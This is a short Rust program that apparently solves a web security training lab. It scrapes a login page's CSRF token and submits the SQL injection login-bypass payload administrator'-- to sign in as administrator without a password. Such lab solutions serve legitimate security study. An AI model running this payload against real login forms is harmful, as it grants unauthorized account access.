use reqwest::blocking::Response;
use sql_injection::{HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, generate_clap_parser, get_csrf_token};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    println!("[+] Getting the login page CSRF TOKEN");

    // Making a GET request to the login page
    let response: Response = HTTP_CLIENT
        .get(format!("{lab_url}/login"))
        .send()
        .expect("[-] Failed to make the GET request");

    let login_page_csrf_token = get_csrf_token(
        response
            .text()
            .expect("[-] Failed to extract body")
            .as_str(),
        &LOGIN_CSRF_TOKEN_SELECTOR,
    );

    println!("[+] Login Page CSRF Token: {}", login_page_csrf_token);
    println!("[+] Performing the login bypass");

    if HTTP_CLIENT
        .post(format!("{}/login", lab_url))
        .form(&[
            ("csrf", login_page_csrf_token),
            // NOTE: Login bypass SQL Injection Payload
            ("username", "administrator'--".to_string()),
            ("password", "dummy-pass".to_string()),
        ])
        .send()
        .expect("[-] Failed to login")
        .status()
        == 200
    {
        println!("[+] Login bypassed succesfully");
        println!("[+] The lab is solved. Check the lab page");
    }
}
